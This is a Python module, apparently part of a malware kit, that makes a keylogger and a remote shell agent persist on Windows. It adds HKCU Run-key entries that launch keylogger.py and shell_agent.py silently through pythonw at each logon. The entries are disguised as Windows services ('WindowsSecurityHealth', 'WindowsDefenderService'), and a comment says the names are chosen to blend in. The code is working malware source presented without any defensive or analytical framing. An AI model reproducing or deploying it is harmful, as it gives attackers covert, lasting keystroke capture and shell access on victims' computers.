import winreg
from pathlib import Path
import sys

REG_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"

# Registry value names — chosen to blend in as legit Windows entries
REG_NAME_KEYLOGGER  = "WindowsSecurityHealth"
REG_NAME_SHELL      = "WindowsDefenderService"

# helper functions
def _get_path(script_name: str) -> str:
    """Returns a quoted pythonw + script path for a given script in this directory."""
    python = Path(sys.executable).with_name("pythonw.exe")
    script = Path(__file__).resolve().parent / script_name
    return f'"{python}" "{script}"'

def _install(reg_name: str, script_name: str) -> bool:
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, reg_name, 0, winreg.REG_SZ, _get_path(script_name))
        winreg.CloseKey(key)
        return True
    except Exception:
        return False

def _is_installed(reg_name: str) -> bool:
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, winreg.KEY_READ)
        winreg.QueryValueEx(key, reg_name)
        winreg.CloseKey(key)
        return True
    except Exception:
        return False


# Keylogger persistence
def install_keylogger() -> bool:
    return _install(REG_NAME_KEYLOGGER, "keylogger.py")

def is_keylogger_installed() -> bool:
    return _is_installed(REG_NAME_KEYLOGGER)


# Shell agent persistence
def install_shell() -> bool:
    return _install(REG_NAME_SHELL, "shell_agent.py")

def is_shell_installed() -> bool:
    return _is_installed(REG_NAME_SHELL)


# Legacy aliases — keeps existing callers in keylogger.py working unchanged
install      = install_keylogger
is_installed = is_keylogger_installed


if __name__ == "__main__":
    install_keylogger()
    install_shell()
